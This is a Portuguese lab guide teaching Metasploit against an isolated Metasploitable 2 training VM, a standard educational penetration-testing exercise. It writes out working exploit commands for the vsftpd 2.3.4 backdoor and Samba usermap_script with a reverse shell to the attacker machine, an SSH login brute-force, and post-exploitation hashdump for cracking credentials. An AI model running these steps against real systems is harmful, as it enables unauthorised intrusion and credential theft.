# Lab 4 — Metasploit

Metasploit junta tudo: **recon**, **exploração** e **pós-exploração** num fluxo só. Aqui
o alvo é a **Metasploitable 2** em `10.10.10.20`, na rede privada **Lab**, isolada.

**Monte o alvo antes:** [montar-metasploitable.md](montar-metasploitable.md).

> **Escopo.** Metasploit é a ferramenta onde "errar de alvo" tem o maior custo. Confirme
> **toda vez** que o `RHOSTS` é `10.10.10.20` (a sua VM de treino) e nada mais.
> (ver [regra de ouro](../README.md))

---

## Começar

```bash
sudo msfdb init      # inicia o banco (guarda hosts, serviços, achados)
msfconsole
```
Dentro do console:
```
db_status                 # deve dizer "connected"
workspace -a lab          # um espaço de trabalho só para o lab
```

## Mapa mental dos comandos

| Comando | Para quê |
|---|---|
| `search <termo>` | achar módulo (exploit/auxiliary/post) |
| `use <caminho>` | selecionar um módulo |
| `info` | o que ele faz, alvos, referências (CVE) |
| `show options` | o que precisa configurar |
| `set RHOSTS 10.10.10.20` | definir o alvo |
| `set LHOST 10.10.10.10` | seu Kali (para o retorno da shell) |
| `check` | testar se o alvo é vulnerável (quando o módulo suporta) |
| `run` / `exploit` | disparar |
| `sessions` | listar/entrar em sessões abertas |
| `background` | mandar a sessão para segundo plano |

---

## Exercício 4.1 — recon com db_nmap

```
db_nmap -sV 10.10.10.20
hosts
services
```
`db_nmap` roda o Nmap e guarda tudo no banco. Olhe a lista de serviços e versões: é daí
que saem as ideias de exploração (ex.: `vsftpd 2.3.4`, `UnrealIRCd`, `Samba 3.x`).

## Exercício 4.2 — o backdoor do vsftpd 2.3.4

O FTP da Metasploitable é uma versão que teve um backdoor conhecido (ótimo primeiro
exploit por ser limpo e didático):
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.20
check
run
```
Cai numa **shell de comando**. Teste:
```
id
uname -a
```
`Ctrl+Z` ou `background` para guardar a sessão; `sessions` para listar; `sessions -i 1`
para voltar. **Lição**: ligue a versão do serviço (4.1) à vulnerabilidade — é assim que
se escolhe o exploit, não por tentativa cega.

## Exercício 4.3 — Samba usermap_script (vira Meterpreter)

```
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.20
set LHOST 10.10.10.10
set PAYLOAD cmd/unix/reverse
run
```
Aqui aparece o conceito de **payload** (o que roda no alvo) e **LHOST** (para onde a
shell volta — o seu Kali). Compare uma shell crua com uma sessão **Meterpreter** (use um
módulo que ofereça payload `linux/x86/meterpreter/...`) e explore:
```
sysinfo
getuid
```

## Exercício 4.4 — módulo auxiliary (sem exploit)

Nem todo módulo invade; muitos só coletam. Exemplo, varrer logins:
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.20
set USERNAME msfadmin
set PASS_FILE /caminho/para/senhas.txt
run
```
Mostra como Metasploit também faz o que o Hydra faz (Lab 3) e guarda a credencial achada
no banco (`creds`).

## Exercício 4.5 — pós-exploração

Numa sessão aberta:
```
sessions -i 1
# em Meterpreter:
sysinfo ; getuid ; ifconfig
hashdump            # colhe hashes de senha do alvo...
```
...e aí fecha o ciclo: jogue esses hashes no **Hashcat/John** (Labs 1 e 2). É o fluxo
real: invadir → colher credencial → quebrar → usar. Tudo na sua VM.

---

## Higiene do lab

- Terminou? Volte a Metasploitable ao **ponto de verificação** "limpa" (Hyper-V). Ela
  acumula lixo depois de alguns exploits.
- Mantenha o Metasploit atualizado no Kali: `sudo apt update && sudo apt install metasploit-framework`.
- Dúvida sobre um módulo? `info` traz as referências (CVE) para você estudar **a causa**,
  não só apertar "run". É isso que separa quem entende de quem só copia comando.

Voltar ao começo: [../README.md](../README.md).
